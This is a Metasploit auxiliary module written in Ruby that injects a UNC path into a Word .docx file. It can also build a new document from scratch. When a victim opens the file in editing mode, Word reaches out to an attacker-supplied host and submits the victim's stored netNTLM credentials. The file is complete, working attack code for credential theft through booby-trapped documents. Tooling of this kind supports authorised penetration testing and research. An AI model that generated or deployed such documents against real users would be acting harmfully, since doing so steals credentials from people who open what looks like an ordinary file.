##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'zip/zip' #for extracting files
require 'rex/zip' #for creating files

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word UNC Path Injector',
			'Description'    => %q{
					This module modifies a .docx file that will, upon opening, submit all
					stored netNTLM credentials to a remote host. It can also create an empty docx file.
					If emailed the receiver needs to put the document in editing mode
					before the remote server will be contacted. Preview and read-only
					mode do not work. Verified to work with Microsoft Word 2003,
					2007 and 2010 as of January 2013 date by using auxiliary/server/capture/smb
			},
			'License'        => MSF_LICENSE,
			'References'     =>
			[
				[ 'URL', 'http://jedicorp.com/?p=534' ],
			],
			'Author'         =>
			[
				'SphaZ <cyberphaz[at]gmail.com>'
			]
		))

		register_options(
			[
				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.','']),
				OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document', '']),
				OptString.new('FILENAME', [true, 'Document output filename.', 'stealnetNTLM.docx']),
				OptString.new('DOCAUTHOR',[false,'Document author for empty document.', '']),
			], self.class)
	end

	#here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
	def make_new_file
		metadata_file_data = ""
		metadata_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
		metadata_file_data << " xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" "
		metadata_file_data << "xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" "
		metadata_file_data << "xmlns:dcmitype=\"http://purl.org/dc/dcmitype/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		metadata_file_data << "<dc:creator>#{datastore['DOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['DOCAUTHOR']}"
		metadata_file_data << "</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\"dcterms:W3CDTF\">"
		metadata_file_data << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
		metadata_file_data << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"

		#where to find the skeleton files required for creating an empty document
		data_dir = File.join(Msf::Config.install_root, "data", "exploits", "docx")

		#making the actual docx
		docx = Rex::Zip::Archive.new
		#add skeleton files
		vprint_status("Adding skeleton files from #{data_dir}")
		Dir["#{data_dir}/**/**"].each do |file|
			if not File.directory?(file)
				docx.add_file(file.sub(data_dir,''), File.read(file))
			end
		end
		#add on-the-fly created documents
		vprint_status("Adding injected files")
		docx.add_file("docProps/core.xml", metadata_file_data)
		docx.add_file("word/_rels/settings.xml.rels", @rels_file_data)
		#add the otherwise skipped "hidden" file
		file = "#{data_dir}/_rels/.rels"
		docx.add_file(file.sub(data_dir,''), File.read(file))
		#and lets create the file
		file_create(docx.pack)
	end

	#here we inject an UNC path into an existing file, and store the injected file in FILENAME
	def manipulate_file
		#where do we unpack our source files
		tmp_dir = "#{Dir.tmpdir}/unc#{Time.now.to_i}#{rand(1000)}/"
		ref = "<w:attachedTemplate r:id=\"rId1\"/>"

		if not File.exists?(datastore['SOURCE'])
			print_error("File #{datastore['SOURCE']} does not exist.")
			return nil	
		end
		
		if not File.stat(datastore['SOURCE']).readable?
			print_error("Not enough rights to read the file. Aborting.")
			return nil
		end

		#lets extract our docx
		if unzip_docx(tmp_dir).nil?
			return nil
		end

		file_content = File.read("#{tmp_dir}/word/settings.xml")

		#if we can find the reference, we don't need to add it and can just inject our unc file.
		if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
			update_docx_file(tmp_dir,"word/_rels/settings.xml.rels", @rels_file_data)
			# lets zip the end result
			zip_docx(tmp_dir)
		else
			#now insert the reference to the file that will enable our malicious entry
			insert_one = file_content.index("<w:defaultTabStop")

			if insert_one.nil?
				insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
				if not insert_two.nil?
					vprint_status("HypenationZone found, we use this for insertion.")
					file_content.insert(insert_two, ref )
				end
			else
				vprint_status("DefaultTabStop found, we use this for insertion.")
				file_content.insert(insert_one, ref )
			end

			if insert_one.nil? && insert_two.nil?
				print_error("Cannot find insert point for reference into settings.xml")
				FileUtils.rm_rf(tmp_dir)
				return nil
			end

			#update the files that contain the injection and reference
			update_docx_file(tmp_dir, "word/settings.xml",file_content)
			update_docx_file(tmp_dir, "word/_rels/settings.xml.rels", @rels_file_data)

			#lets zip the file
			zip_docx(tmp_dir)
		end
	return 0
	end

	#making the actual docx
	def zip_docx(tmp_dir)
		docx = Rex::Zip::Archive.new
		#add skeleton files
		vprint_status("Adding files from #{tmp_dir}")
		Dir["#{tmp_dir}/**/**"].each do |file|
			if not File.directory?(file)
				docx.add_file(file.sub(tmp_dir,''), File.read(file))
			end
		end
		#add the otherwise skipped "hidden" file
		file = "#{tmp_dir}/_rels/.rels"
		docx.add_file(file.sub(tmp_dir,''), File.read(file))
		file_create(docx.pack)
		FileUtils.rm_rf(tmp_dir)
	end

	#unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
	def unzip_docx(tmp_dir)
		#create temoprary directory so we can do some error handling if needed.
		begin
			if File.directory?(tmp_dir)
				FileUtils.rm_rf(tmp_dir)
			end
			FileUtils.mkdir_p(tmp_dir) 
		rescue
			print_error("Error creating/deleting temporary directory #{tmp_dir}, check rights.")
			return nil
		end
		#unzip the SOURCE document into the tmp_dir
		vprint_status("Rubyzip sometimes corrupts the document, so we do it the hard way. Extracting #{datastore['SOURCE']}")
		begin
			Zip::ZipFile.open(datastore['SOURCE'])  do |filezip|
				filezip.each do |entry|
					fpath = File.join(tmp_dir, entry.name)
					FileUtils.mkdir_p(File.dirname(fpath))
					filezip.extract(entry, fpath)
				end
			end
		rescue Zip::ZipError => e
			print_error("Error extracting #{datastore['SOURCE']} please verify it is a valid .docx document.")
			return nil
		end
		return 0
	end

	#used for updating the files inside the docx from a string
	def update_docx_file(tmp_dir,file_string, content)
		archive = File.join(tmp_dir, file_string)
		vprint_status("We need to look for: #{archive}")
		if File.exists?(archive)
			vprint_status("Deleting original file #{archive}")
			File.delete(archive)
		end
		File.open(archive, 'wb+') { |f| f.write(content) }
	end

	def run
		#we need this in make_new_file and manipulate_file
		@rels_file_data = ""
		@rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
		@rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
		@rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/".chomp
		@rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"

		if "#{datastore['SOURCE']}" == ""
			#make an empty file
			print_status("Creating empty document")
			make_new_file
		else
			#extract the word/settings.xml and edit in the reference we need
			print_status("Injecting UNC path into existing document.")
			if not manipulate_file.nil?
				print_good("Copy of #{datastore['SOURCE']} called #{datastore['FILENAME']} points to #{datastore['LHOST']}.")
			end
		end
	end
end
